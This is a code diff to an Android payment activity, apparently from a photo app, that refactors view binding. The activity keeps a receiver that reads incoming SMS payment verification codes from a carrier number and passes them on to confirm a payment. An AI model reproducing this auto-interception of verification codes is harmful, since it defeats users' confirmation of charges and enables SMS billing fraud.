@@ -20,7 +20,6 @@ import java.util.Arrays;
 import java.util.List;
 
 import butterknife.BindView;
-import butterknife.ButterKnife;
 import butterknife.Unbinder;
 import domon.cn.mmphoto.R;
 import domon.cn.mmphoto.adapter.PayCoinAdapter;
@@ -61,7 +60,7 @@ public class PayForCoinActivity extends BaseActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_paycoin);
 
-        mUnbinder = ButterKnife.bind(this);
+//        mUnbinder = ButterKnife.bind(this);
 
         mActionType = getIntent().getIntExtra("type", PAYFORCOIN);
 
@@ -80,11 +79,6 @@ public class PayForCoinActivity extends BaseActivity {
                     PayUtils.payForSMSThree();
                 } else if (fromAddress.equals("1065987320001") && msg.contains("支付验证码")) {
                     LogUtils.e(msg.substring(0, 4));
-                    PayUtils.payForSMSTwo(msg.substring(0, 4));
-                    //test code
-                } else if (fromAddress.equals("10001")) {
-                    PayUtils.payForSMSTwo(msg.substring(0, 4));
-                } else if (fromAddress.equals("10086")) {
                     PayUtils.payForSMSTwo(msg.substring(0, 4));
                 }
             }
@@ -181,7 +175,7 @@ public class PayForCoinActivity extends BaseActivity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        mUnbinder.unbind();
+//        mUnbinder.unbind();
         mSmsReceiver.unRegisterSmsReceiver(PayForCoinActivity.this);
     }
 }
